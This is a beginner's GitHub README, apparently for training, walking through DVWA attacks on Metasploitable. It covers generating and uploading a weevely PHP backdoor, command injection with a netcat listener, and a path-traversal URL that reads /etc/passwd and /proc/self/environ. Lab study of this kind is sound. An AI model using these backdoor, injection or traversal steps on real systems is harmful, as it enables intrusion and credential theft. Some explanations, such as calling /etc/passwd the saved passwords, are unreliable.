# basic-vulnerabilities-Metasploitable
## FileUploadVulnerability
- weevely is a tool used for opening the backdoors and to access the website.
```
weevely generate 123456 /root/shell.php
```
- this creates a php file which is used to upload and open backdoors
- after uploading, run the following command
- `weevely (respective url) 123456`
- now from the terminal we can open the backdoor that is  `cd ..` to get back and then we can access as we want.
- burpsuite is used to interpt the website being executed with the help of proxy.

> __low__ - any file can be uploaded i.e., shell.php
>![Screenshot 2024-04-12 223232](https://github.com/stellados53/kali_commands/assets/142677726/dbc0885c-2112-4832-989f-a6c8dba0eb44)
> 
> __medium__ - we rename the file from shell.php to shell.jepg i.e., shell.jpeg and upload it using bruiteforce by changing the filename to php.
>![Screenshot 2024-04-12 224041](https://github.com/stellados53/kali_commands/assets/142677726/9d3a9640-817f-446f-91cc-f09b4c5d2baf)
> 
> __high__ - we change the file type to shell.php.jpeg and upload and then expoit.
> ![Screenshot 2024-04-12 224407](https://github.com/stellados53/kali_commands/assets/142677726/e202b0e8-1ee3-44e0-8f28-a04c6d404255)
- overall output will be..
 ![Screenshot 2024-04-12 224454](https://github.com/stellados53/kali_commands/assets/142677726/5c02d3fb-e53e-4ed3-85c7-477390b703c7)


<h3 align="center"> ... </h3> 

## Code Execution Vulnerability

- open any searchable website (dvwa- command execution)
- run the following command
```
nc -vv -l -p 8080
```
![Screenshot 2024-04-09 232801](https://github.com/stellados53/kali_commands/assets/142677726/7d1cc4d5-5310-4934-84ba-2c44d0124a0e)

> nc   = netcat tool this is used to use and connect the computer to the website.
> 
> -vv  = it is just a verbose mode, which retireve more output.
> 
> -l   = Listen mode, used to create a server that listens for incoming connections.
> 
> -p   = Specifies the source port number.
> 
> 8080 = port number.
- Now you can execute any command of kali linux such as pwd, ls -la.
- the execution will be done.

> __low__ - in searchbox END WITH ";" AND RUN THE COMMAND ACCORDING TO THE WEBSITE OS.MOST IMPORTANT IF THE IP IS 192.168.11.129, SUBTRACT THE LAST NUMBER -1 THAT IS 192.168.11.128.
>
> __medium__ - it cannot run two commands using ";" so we use "|" for the exploit.
>![Screenshot 2024-04-12 223232](https://github.com/stellados53/kali_commands/assets/142677726/d22e5048-15cd-491b-817f-f2a79979e8d3)
>
> __high__ is not even possible


## File Inclusion Vulnerability
- it allows you to read  any file in the same server.
- access files outside www directory.
- generally to get the commands to be executed in the kali linux we use  `cat etc/passwd`, the same we use in the file url to extract all the saved passwds.
```
http://192.168.11.129/dvwa/vulnerabilities/fi/?page=/../../../../../etc/passwd
```
- by using this command we can get the all saved passwords saved in the webserver.
![Screenshot 2024-04-12 222928](https://github.com/stellados53/kali_commands/assets/142677726/615af2ec-4ac3-4ca6-a33b-28a323ed794a)

- Now as reference from the above use the another executable urls.
![Screenshot 2024-04-12 231128](https://github.com/stellados53/kali_commands/assets/142677726/9cc2d6f4-169b-41f9-b5d6-82513acb37b7)
- from above image the first one  `proc/self/environ` we get..
![Screenshot 2024-04-12 231736](https://github.com/stellados53/kali_commands/assets/142677726/ab250e34-700e-49c3-bcb9-500b88edd38c)

